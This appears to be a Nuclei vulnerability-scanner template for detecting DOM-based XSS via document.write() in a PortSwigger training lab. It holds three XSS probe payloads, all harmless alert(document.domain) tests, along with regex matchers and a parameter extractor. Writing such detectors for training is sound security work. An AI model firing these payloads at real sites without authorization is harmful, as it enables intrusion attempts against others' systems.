id: xss-dom-based

info:
  name: "PortSwigger DOM XSS via document.write() in search"
  author: "Fabian Morales"
  severity: "high"
  description: "Detects the specific DOM XSS vulnerability in PortSwigger's lab using document.write()"
  reference:
    - "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink"
  tags: xss,dom,portswigger,lab,document-write

http:
  - method: GET
    path:
      - "{{BaseURL}}/?search=\"><svg onload=alert(document.domain)>"
      - "{{BaseURL}}/?search=\"onmouseover=alert(document.domain)>"
      - "{{BaseURL}}/?search=<script>alert(document.domain)</script>"

    headers:
      User-Agent: "Mozilla/5.0"
      Accept: "text/html,application/xhtml+xml"

    matchers:
      - type: regex
        part: body
        regex:
          - "<svg onload=alert\\(document\\.domain\\)>"
          - "onmouseover=alert\\(document\\.domain\\)"
          - "<script>alert\\(document\\.domain\\)</script>"
        condition: or

    extractors:
      - type: regex
        name: vulnerable_parameter
        regex:
          - "document\\.write\\(.*?search=([^&]+)"
        group: 1